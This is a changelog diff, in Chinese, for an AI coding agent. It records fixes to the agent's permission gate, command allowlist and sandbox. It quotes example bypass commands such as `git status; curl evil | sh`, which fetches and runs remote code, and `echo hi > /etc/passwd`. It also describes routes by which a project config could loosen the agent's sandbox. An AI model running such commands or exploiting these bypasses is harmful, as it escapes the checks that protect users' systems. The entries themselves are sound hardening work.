@@ -47,6 +47,28 @@ All notable changes to DeepseekNova will be documented in this file.
 
 ### Fixed
 
+- **Windows 路径逃逸防护回归（安全）**：`PermissionGate` 对写工具收到的**畸形
+  JSON**（Windows 路径未转义反斜杠使 `\a`/`\.` 成为非法转义）曾静默降级并跳过
+  工作区路径守卫 → 现 fail-closed 硬拒；`is_within_workspace` 改为**词法判定
+  优先**（跨平台一致，`..` 弹出根外即拒），canonicalize 仅作 symlink 补充。
+  修复 CI `cargo test (windows-latest)` 上两个路径逃逸回归测试的持续失败。
+- **安全项（审查确认 F1–F6）**：
+  - `rg`/`yq` 从"任意参数安全"表降级为专项白名单：`rg --pre`（命令执行器）、
+    `yq -i`/`--inplace`（就地写文件）不再免询问放行。
+  - `SecurityPolicy::is_command_allowed` 前缀匹配不再被 shell 组合绕过：
+    按 argv 词边界匹配 + 拒绝未引用 `|;&<>`/`$()`/反引号（`echo hi > /etc/passwd`、
+    `git status; curl evil | sh` 均拒绝）。
+  - `write_file`/`edit_file` 的 `.tmp` 原子写改用 `O_EXCL`（`create_new`）：
+    预埋 symlink 指向工作区外时写入失败而非跟随链接写外部文件。
+  - 主 agent 路径无审批 responder 时 `Ask` 自动允许改为**记录安全审计事件**
+    （`security_event = "ask_auto_allowed_no_responder"`），fail-closed 调用方可
+    配置 `mode=deny`。
+  - Seatbelt 配置可写路径插值转义 SBPL 特殊字符，恶意项目 `deepseeknova.toml`
+    无法再注入规则放宽自身沙箱。
+- **fetch_full_result 工具接线（token 节省闭环）**：`FetchFullResultTool` 原为
+  孤儿模块（从未注册），但截断提示会引导模型调用不存在的工具；现以共享
+  `Arc<tokio::sync::RwLock<Memory>>` 注册进运行工具集，大工具结果截断后模型可
+  凭 call_id 按需取回完整版。
 - LSP 空诊断不再等满 `timeout_secs`：收到空 `publishDiagnostics` 后 1.5s 内
   无迟到的非空更新即返回“No LSP diagnostics”。
 - Auto 路由改为每 run 决策一次（由 Agent 循环持有），serve 并发请求不再共享
